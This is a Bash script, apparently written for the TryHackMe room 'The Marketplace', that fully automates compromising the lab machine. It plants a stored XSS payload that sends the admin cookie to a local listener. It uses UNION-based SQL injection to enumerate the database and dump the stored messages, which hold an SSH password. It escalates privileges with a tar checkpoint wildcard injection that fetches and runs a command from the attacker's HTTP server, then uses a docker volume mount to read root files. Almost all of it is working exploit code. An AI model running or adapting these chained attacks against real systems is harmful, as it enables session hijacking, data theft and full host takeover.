#!/bin/bash

echo -e "                             __   \n\
 ____  ___  __  __________  / /__ \n\
/_  / / _ \/ / / / ___/ _ \/ / _ \  Autopwn para The Marketplace - TryHackMe\n\
 / /_/  __/ /_/ / /__/  __/ /  __/  Hecho por zeycele - https://github.com/rjceledon\n\
/___/\___/\__, /\___/\___/_/\___/ \n\
         /____/                   "

ip=$1
ip_local=$(ip address show dev tun0 | grep inet | head -n 1 | awk '{print $2}' | awk '{print $1}' FS='/')
echo -e "[*] Enumerando web http://$ip"
whatweb --color=never http://$ip

username=$(echo $RANDOM | md5sum | head -c 8; echo)
password=$(echo $RANDOM | md5sum | head -c 8; echo)
echo -e "\n[*] Creando usuario '$username' con clave '$password' en http://$ip/signup"
if [ `curl -s -d "username=$username&password=$password" http://$ip/signup | grep -q successfully; echo $?` == 0 ]; then
    echo -e "[+] Creacion de usuario exitosa!\n"
else
    echo -e "[!] ERROR: Saliendo..."
    exit 1
fi

item=""
try=1
while [ "$item" == "" ]; do
    echo -e "[!] Intento $try:\n  [*] Logeando con usuario '$username' y obteniendo 'token' Cookie"
    cookie=$(curl -s -d "username=$username&password=$password" http://$ip/login -L -i | html2text | grep token)
    cookie="$cookie"
    echo -e "       [+] Obtenida Cookie 'token' de sesion: $(echo $cookie | head -c 12)..."

    echo -e "   [*] Creando item XSRF malicioso..."
    xsrf_payload="title=XSRF&description=%3Cscript%3Edocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2F$ip_local%2Fimage.jpg%3F%27+%2B+document.cookie+%2B+%27%22%3E%3C%2Fimg%3E%27%29%3C%2Fscript%3E"
    item=$(curl -s -d $xsrf_payload -b $cookie http://$ip/new -L -i | html2text | grep item | tr ' ' '\n' | grep item | awk 'NF{print $NF}' FS='/')
    try=$(( try + 1 ))
done

echo "      [+] Item malicioso creado: $item"

echo -e "\n[*] Abriendo puerto 80 para escucha..."
sudo nc -nlzp 80 > tmp &
disown
sleep 2

echo -e "\n[*] Reportando item malicioso $item"
curl -s -d "" -b $cookie http://$ip/report/$item -L &>/dev/null

adm_token=""
while [ "$adm_token" == "" ]; do
    adm_token=$(/bin/cat tmp | grep GET | awk '{print $2}' FS='?' | awk '{print $1}')
done

rm -f tmp

echo -e " [+] Obtenido token de admin: $adm_token"
echo -e "[*] Cerrando puerto 80, pid(s): $(pgrep nc | tr '\n' ' ')"
sudo killall -9 nc &>/dev/null

flag1=$(curl -s -b $adm_token http://$ip/admin | grep String.fromCharCode | awk '{print $4}' FS='+' | sed s/"'"//g | tr -d " ")
flag1="THM{$flag1}"
echo -e "\n[!!!] Obtenida flag1: $flag1"
sleep 2

echo -e "\n[*] Obteniendo tamano de tabla en http://$ip/admin?user=1..."
for i in $(seq 1 100); do
    curl -s -b $adm_token "http://$ip/admin?user=1%20ORDER%20BY%20$i;--%20-" | html2text | grep -q Error && count=$((i - 1)) && break
done
sec=$(seq 1 $count | tr '\n' ',')
sec=${sec::-1}

echo "  [+] Conseguidas $count columnas"

echo -e "\n[*] Ubicando posicion a inyectar..."
grep_out=$(curl -s -b $adm_token "http://$ip/admin?user=-1%20UNION%20SELECT%20$sec;--%20-" | grep '2')
grep_preffix=$(echo $grep_out | awk '{print $1}' FS='2')
grep_suffix=$(echo $grep_out | awk '{print $2}' FS='2')
echo -e "   [+] Encontrada posicion en '$grep_preffix>SQLINJECT<$grep_suffix'"

echo -e "[*] Listando bases de datos:"
bd_dump=$(echo $sec | sed s/'2'/'group_concat(schema_name)'/)
bd_list=$(curl -s -b $adm_token "http://$ip/admin?user=-1%20UNION%20SELECT%20$bd_dump%20FROM%20information_schema.schemata;--%20-" | grep "$grep_preffix" | grep "$grep_suffix" | awk '{print $2}' FS="$grep_preffix" | awk '{print $1}' FS="$grep_suffix")
echo "	[+] Bases de datos encontradas: $bd_list"

schema=$(echo $bd_list | awk '{print $2}' FS=',')
echo -e "[*] Listando tablas en '$schema':"
table_dump=$(echo $sec | sed s/'2'/'group_concat(table_name)'/)
table_list=$(curl -s -b $adm_token "http://$ip/admin?user=-1%20UNION%20SELECT%20$table_dump%20FROM%20information_schema.tables%20WHERE%20table_schema%3d'$schema';--%20-" | grep "$grep_preffix" | grep "$grep_suffix" | awk '{print $2}' FS="$grep_preffix" | awk '{print $1}' FS="$grep_suffix")
echo "	[+] Tablas encontradas en '$schema': $table_list"

table=$(echo $table_list | awk '{print $2}' FS=',')
column_dump=$(echo $sec | sed s/'2'/'group_concat(column_name)'/)
echo -e "[*] Listando columnas en '$table':"
column_list=$(curl -s -b $adm_token "http://$ip/admin?user=-1%20UNION%20SELECT%20$column_dump%20FROM%20information_schema.columns%20WHERE%20table_name%3d'$table';--%20-" | grep "$grep_preffix" | grep "$grep_suffix" | awk '{print $2}' FS="$grep_preffix" | awk '{print $1}' FS="$grep_suffix")
echo "	[+] Columnas encontradas en '$table': $column_list"

content='user_from,user_to,message_content'
content_search=$(echo $content | sed s/','/',0x3a,'/g)
content_dump=$(echo $sec | sed s/'2'/"group_concat($content_search)"/)
echo -e "[*] Listando contenido de '$content':"
content_list=$(curl -s -b $adm_token "http://$ip/admin?user=-1%20UNION%20SELECT%20$content_dump%20FROM%20$table;--%20-" | html2text | head -n -3 | tail -n +4 | sed s/'User '//)
messages=$(echo $content_list | tr ',' '\n')
echo -e "	[+] Contenido encontrado en '$table': \n\n$messages"
ssh_pass=$(echo $messages | grep password | awk '{print $2}' FS='password is: ' | awk '{print $1}')
user_is=$(curl -s -b $adm_token "http://$ip/admin?user=3" | html2text | grep User | grep -v 3 | awk '{print $2}')
echo -e "\n[*] Usuario 3 es '$user_is', su clave SSH es $ssh_pass"

rm index.html 2>/dev/null

echo -e "\n[*] Creando exploit y montando servidor HTTP local..."
echo "docker run -v /:/mnt --rm alpine cat /mnt/root/root.txt" > index.html
sudo python -m http.server 80 &>/dev/null &
disown
sleep 3

echo -e "[*] Logeando como '$user_is' y realizando movimiento lateral..."
execute="cat user.txt; rm /opt/backups/backup.tar; rm -f ./--*; touch -- --checkpoint=1; touch -- --checkpoint-action=exec=\$\(curl\ -s\ $ip_local\); sudo -u michael /opt/backups/backup.sh"
text=$(sshpass -p $ssh_pass ssh -o StrictHostKeyChecking=accept-new $user_is@$ip $execute 2>/dev/null)
flags23=$(echo $text | tr ' ' '\n' | grep THM)
flag2=$(echo $flags23 | awk '{print $1}')
flag3=$(echo $flags23 | awk '{print $2}')

echo -e "\n [+] Escalada de privilegios exitosa!\n"

echo -e "[!!!] Obtenida flag1: $flag1"
echo -e "[!!!] Obtenida flag2 user.txt: $flag2"
echo -e "[!!!] Obtenida flag3 root.txt: $flag3"

sudo killall -9 'python' &>/dev/null 2>&1
rm index.html
echo -e "\n\n[*] Limpiando y saliendo..."

exit 0
